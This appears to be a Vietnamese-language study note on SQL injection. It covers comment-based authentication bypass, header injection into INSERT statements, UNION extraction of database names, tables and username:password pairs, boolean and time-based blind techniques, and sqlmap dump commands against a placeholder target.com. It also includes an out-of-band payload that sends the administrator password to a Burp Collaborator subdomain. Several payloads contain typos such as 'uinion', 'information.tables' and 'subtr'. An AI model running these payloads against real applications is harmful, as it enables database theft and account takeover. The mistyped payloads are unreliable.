## SQL Injection
SQL injection (SQLi) là một kỹ thuật tấn công mạng nguy hiểm, trong đó kẻ tấn công chèn mã SQL độc hại vào các truy vấn SQL của ứng dụng web. Lỗ hổng này xảy ra khi ứng dụng không kiểm tra hoặc xác thực đúng cách dữ liệu đầu vào từ người dùng, cho phép kẻ tấn công thay đổi logic của câu truy vấn ban đầu để khai thác cơ sở dữ liệu.
### Chúng có thể làm những gì?
- Vượt qua cơ chế xác thực (Login no user, password)
- Thu thập thông tin nhạy cảm trong database
- Thay đổi tính toàn vẹn của data (Insert, Update, Delete, Drop)
- Đọc các thông tin của server (Read File Local)
- Tạo ra các Backdoor, Webshell trên máy chủ (Write File Local)
- Thực thi lệnh trên hệ thống
### Cách khai thác
#### Làm thế nào để thực hiện chèn mã sql vào trang web, vô hiệu hóa mã sql có sẵn của hệ thống
1. SQL Trong SELECT, WHERE
  + Sử dụng các kí hiệu `--, #, /**/` lưu ý khi commend nó chỉ commend các câu lệnh phía sau nên code phía trước vẫn tiếp tục chạy (có 1 lưu ý nhỏ là thường thì nếu dữ liệu bị khoảng trắng ở 2 đầu thì họ có thể sử dụng hàm `trim()` để bỏ các khoảng trống đi nên sẽ không thể sử dụng commend thì trick ở đây là ta nên chèn `-- -` để khoảng trắng không bị xóa để không xảy ra lỗi syntask)
      <img width="2499" height="1231" alt="image" src="https://github.com/user-attachments/assets/2b180f32-121d-48e1-aff7-4b5d93c17645" />
  + Nhưng nếu username không có 'admin' thì sao? Ta có thể sử dụng câu lệnh này để bypass hệ thống
      <img width="2504" height="1219" alt="image" src="https://github.com/user-attachments/assets/9dd27e28-9cce-4afd-a9a2-4cc86fb9d961" />
  + Thay vì commend để bỏ lệnh phía sau, trong 1 vài trường hợp ta vẫn sẽ cho nó thực hiện tiếp tục lệnh phía sau
2. SQL Trong INSERT
  + Thông thường server sẽ có thể lưu dư liệu truy cập vào 1 file vd như `access log` để lưu những thông tin như IP, User-Agent, Referer, Cookie, Timestamp... Thì rất có thể sẽ lấy thông tin từ Header của request. Ta có thể tận dụng nó để thay đổi các thẻ Header xem có thể có chứa SQL Injection không
    <img width="1176" height="461" alt="image" src="https://github.com/user-attachments/assets/5458e60f-31a4-4328-9a4c-852b8b868c91" />
3. SQL xảy ra ở câu truy vấn UPDATE và DELETE
  + Ở trường hợp này nhất định đừng sài tool vì nó có thể dẫn đến mất toàn bộ dữ liệu hệ thống
#### Khai thác Union
- Giả sử có url: `http://target.com/page.php?id=1` thì ta sẽ có payload `?id=1 UNION SELECT 1,2,3--`
- Quy trình dùng union select để attack
  1. Xác định số cột
    + Dùng Order by để thử ?id=1 ORDER BY 3-- ✅ ?id=1 ORDER BY 4-- ❌ (lỗi) -> có 3 cột
  2. Tìm cột hiển thị ra ngoài
    + Dùng ?id=-1 UNION SELECT 1,2,3-- nếu trang hiện ra số 2 -> cột 2 show content ra
  3. Trích xuất thông tin từ DB
    + Lấy DB hiện tại: `?id=-1 union select 1,database(),3--`
    + Lấy tên tất cả DB: `?id=-1 union select 1,group_concat(schema_name),3 from information_schema.schemata--`
    + Lấy bảng của DB hiện tại: `?id=-1 union select 1,group_concat(table_name),3 from information.tables where table_schema=database()--`
    + Lấy cột từ bảng cụ thể: `?id=-1 union select 1,group_concat(column_name),3 from information_schema.columns where table_name='users--`
    + Dump dữ liệu: `?id=-1 uinion select 1,group_concat(username,0x3a,password),3 from users--`
#### Inference SQL Injection
1. Boolean
- Thay vì DB return về dữ liệu thì nó chỉ return về đúng hay sai, lúc này ta sử dụng brute force để đoán
- URL: http://target.com/page.php?id=1 thì
  ?id=1 AND 1=1 --> đúng → trang bình thường
  ?id=1 AND 1=2 --> sai → trang trắng, khác giao diện
- Khi đã xác định có inference thì ta sẽ brure force. Ở đây mình sẽ tìm password của admin
  1. Trước tiên mình sẽ tìm length để dễ đoán hơn `?id=1 and (select length(password) from users where username='admin') >= $number$` ở đây number, mình sẽ check bằng thuật toán chặt nhị phân để giảm đi số request đoán
  2. Khi đã xác định được length thì mình sẽ viết tool hoặc sử dụng burp intruder để check bằng cách
  `?id=1 and (select subtr(password,$num$,1) from users where username='admin') = '$char$'` thì 2 biến num và char bạn sẽ thay bằng các ký tự thích hợp
2. Time-based
- Nếu server có chức năng chặn nhiều request mà sai nhiều lần đến thì sao? ta sẽ sử dụng 1 kỹ thuật tìm time trả về của request, ý tưởng ở đây là sẽ chuyển ký tự sang mã ascii để gắn vào hàm sleep từ đó ta dựa vào time để tìm đáp án, tuy nhiên đây sẽ có sai số vì còn dựa vào đường truyền, vị trí.... nên có thể ảnh hưởng rất nhiều đến thời gian trả về nên kỹ thuật này không được áp dụng nhiều (ta có thể sử dụng trung bình cộng của khoảng 100 request để tìm thời gian nhưng chỉ là tương đối)
payload: `'%3BSELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,a,1)='1')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM+users--`
payload OFB: `'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--`
### Sài TooL SQLMAP
- Liệt kê database `sqlmap -u "http://target.com/page.php?id=1" --dbs --batch` -> vd name_db product
- Liệt kê bảng trong database `sqlmap -u "http://target.com/page.php?id=1" -D product --tables --batch` -> bảng users
- Liệt kê cột trang database `sqlmap -u "http://target.com/page.php?id=1" -D product -T users --columns --batch` cột user, password
- Dump dữ liệu `sqlmap -u "http://target.com/page.php?id=1" -D product -T user -C user,password --dump --batch`
